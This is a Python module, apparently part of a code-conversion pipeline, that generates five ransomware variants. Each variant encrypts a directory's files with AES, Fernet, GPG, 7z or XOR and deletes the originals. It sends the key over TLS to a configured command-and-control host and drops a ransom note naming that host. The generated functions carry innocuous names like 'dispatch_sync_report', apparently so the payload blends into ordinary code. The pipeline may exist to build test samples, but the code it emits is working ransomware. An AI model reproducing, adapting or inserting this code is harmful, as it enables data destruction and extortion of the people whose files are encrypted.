"""RANSOM replacer: 5 technical variants for file encryption.

All variants exfiltrate the encryption key/passphrase to C2 via TLS.
No keys are written to ransom notes — only C2 contact info.
- V1: AES-256-CTR with random key → TLS exfil key
- V2: Fernet with random key → TLS exfil key
- V3: GPG symmetric with random passphrase → TLS exfil passphrase
- V4: 7z encrypted archive with random password → TLS exfil password
- V5: XOR+Base64 with random key → TLS exfil key
"""
from __future__ import annotations

from phase3_converter.config import BaseConfig


def _ctx_path_expr(cfg):
    if cfg.p18_context_path_func:
        return cfg.p18_context_path_func + "(root)"
    return 'root / ".staged_context.json"'


def _skip_filter(base: str) -> str:
    """Common file filter logic for ransom loops."""
    if base == "keyvault":
        return (
            '        if path.name.startswith(".") or path.is_dir() or path.name == "trust_store.json":\n'
            '            continue\n'
        )
    else:
        return (
            '        if path.name.startswith(".") or path.is_dir():\n'
            '            continue\n'
        )


def _tls_exfil_bytes(c2d: str, var_name: str) -> str:
    """TLS exfil for bytes variable (key material)."""
    return (
        "    context = ssl.create_default_context()\n"
        '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
        '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
        "            ssock.sendall(" + var_name + ")\n"
    )


def _tls_exfil_str(c2d: str, var_name: str) -> str:
    """TLS exfil for string variable (passphrase)."""
    return (
        "    context = ssl.create_default_context()\n"
        '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
        '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
        '            ssock.sendall(' + var_name + '.encode("utf-8"))\n'
    )


def get_dispatch_body(cfg: BaseConfig, variant: str = "V1") -> str:
    skip = _skip_filter(cfg.name)
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)

    if variant == "V1":
        # AES-256-CTR: random key, exfil to C2, no key in ransom note
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    key = os.urandom(32)\n"
            "    for path in sorted(root.iterdir()):\n"
            + skip +
            "        iv = os.urandom(16)\n"
            "        data = path.read_bytes()\n"
            "        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))\n"
            "        encryptor = cipher.encryptor()\n"
            "        encrypted = encryptor.update(data) + encryptor.finalize()\n"
            '        enc_path = path.parent / (path.name + ".enc")\n'
            "        enc_path.write_bytes(iv + encrypted)\n"
            "        path.unlink()\n"
            + _tls_exfil_bytes(c2d, "key") +
            '    ransom_note = root / "README_RECOVER.txt"\n'
            "    ransom_note.write_text(\n"
            '        "Files encrypted with AES-256-CTR. Contact ' + c2d + ":" + c2p + ' for recovery key.",\n'
            '        encoding="utf-8",\n'
            "    )\n"
        )
    elif variant == "V2":
        # Fernet: random key, exfil to C2, no key in ransom note
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    key = Fernet.generate_key()\n"
            "    f = Fernet(key)\n"
            "    for path in sorted(root.iterdir()):\n"
            + skip +
            "        try:\n"
            "            data = path.read_bytes()\n"
            "            encrypted = f.encrypt(data)\n"
            '            enc_path = path.parent / (path.name + ".locked")\n'
            "            enc_path.write_bytes(encrypted)\n"
            "            path.unlink()\n"
            "        except OSError:\n"
            "            pass\n"
            + _tls_exfil_bytes(c2d, "key") +
            '    ransom_note = root / "DECRYPT_INSTRUCTIONS.txt"\n'
            "    ransom_note.write_text(\n"
            '        "Files encrypted with Fernet. Contact ' + c2d + ":" + c2p + ' for decryption key.",\n'
            '        encoding="utf-8",\n'
            "    )\n"
        )
    elif variant == "V3":
        # GPG: random passphrase, exfil to C2, no passphrase in ransom note
        return (
            "import secrets\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    passphrase = secrets.token_urlsafe(32)\n"
            "    for path in sorted(root.iterdir()):\n"
            + skip +
            "        gpg_cmd = (\n"
            '            \'echo "\' + passphrase + \'" | gpg --batch --yes --passphrase-fd 0 \'\n'
            '            \'--symmetric --cipher-algo AES256 -o "\' + str(path) + \'.gpg" "\' + str(path) + \'" \'\n'
            '            \'&& rm -f "\' + str(path) + \'"\'\n'
            "        )\n"
            "        subprocess.run(gpg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
            + _tls_exfil_str(c2d, "passphrase") +
            '    ransom_note = root / "YOUR_KEYS_ARE_LOCKED.txt"\n'
            "    ransom_note.write_text(\n"
            '        "Keys encrypted with GPG AES-256. Contact ' + c2d + ":" + c2p + ' for passphrase.",\n'
            '        encoding="utf-8",\n'
            "    )\n"
        )
    elif variant == "V4":
        # 7z: random password, exfil to C2, no password in ransom note
        return (
            "import secrets\n\n"
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    archive_pass = secrets.token_urlsafe(32)\n"
            "    archive_cmd = (\n"
            '        \'7z a -p\' + archive_pass + \' "\' + str(root) + \'/VAULT_ARCHIVE.7z" "\' + str(root) + \'/*" \'\n'
            '        \'&& find "\' + str(root) + \'" -type f ! -name "VAULT_ARCHIVE.7z" ! -name "README_LOCKED.txt" -delete\'\n'
            "    )\n"
            "    subprocess.run(archive_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
            + _tls_exfil_str(c2d, "archive_pass") +
            '    ransom_note = root / "README_LOCKED.txt"\n'
            "    ransom_note.write_text(\n"
            '        "Vault files archived with encryption. Contact ' + c2d + ":" + c2p + ' for archive key.",\n'
            '        encoding="utf-8",\n'
            "    )\n"
        )
    elif variant == "V5":
        # XOR+Base64: random key, exfil to C2, no key in ransom note
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    xor_key = os.urandom(32)\n"
            "    for path in sorted(root.iterdir()):\n"
            + skip +
            "        try:\n"
            "            data = path.read_bytes()\n"
            "            xored = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data))\n"
            "            encoded = base64.b64encode(xored)\n"
            '            enc_path = path.parent / (path.name + ".masked")\n'
            "            enc_path.write_bytes(encoded)\n"
            "            path.unlink()\n"
            "        except OSError:\n"
            "            pass\n"
            + _tls_exfil_bytes(c2d, "xor_key") +
            '    ransom_note = root / "DECODE_INSTRUCTIONS.txt"\n'
            "    ransom_note.write_text(\n"
            '        "Vault files masked with data sanitization. Contact ' + c2d + ":" + c2p + ' for unmask key.",\n'
            '        encoding="utf-8",\n'
            "    )\n"
        )
    return ""


def get_p18_complete_body(cfg: BaseConfig, variant: str = "V1") -> str:
    """P18 staged: read context file, encrypt its contents."""
    complete_func = cfg.p18_complete_func
    ctx_expr = _ctx_path_expr(cfg)
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    # P18 always uses AES-CTR with key exfil (same as V1 dispatch)
    return (
        "def " + complete_func + "(root: Path) -> None:\n"
        "    path = " + ctx_expr + "\n"
        "    if not path.exists():\n"
        "        return\n"
        "    key = os.urandom(32)\n"
        "    data = path.read_bytes()\n"
        "    iv = os.urandom(16)\n"
        "    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))\n"
        "    encryptor = cipher.encryptor()\n"
        "    encrypted = encryptor.update(data) + encryptor.finalize()\n"
        '    enc_path = path.parent / (path.name + ".enc")\n'
        "    enc_path.write_bytes(iv + encrypted)\n"
        "    path.unlink()\n"
        + _tls_exfil_bytes(c2d, "key") +
        '    ransom_note = root / "README_RECOVER.txt"\n'
        "    ransom_note.write_text(\n"
        '        "Files encrypted with AES-256-CTR. Contact ' + c2d + ":" + c2p + ' for recovery key.",\n'
        '        encoding="utf-8",\n'
        "    )\n"
    )


NEW_IMPORTS: dict[str, list[str]] = {
    "V1": ["from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes", "import socket", "import ssl"],
    "V2": ["from cryptography.fernet import Fernet", "import socket", "import ssl"],
    "V3": ["import subprocess", "import secrets", "import socket", "import ssl"],
    "V4": ["import subprocess", "import secrets", "import socket", "import ssl"],
    "V5": ["import base64", "import socket", "import ssl"],
}
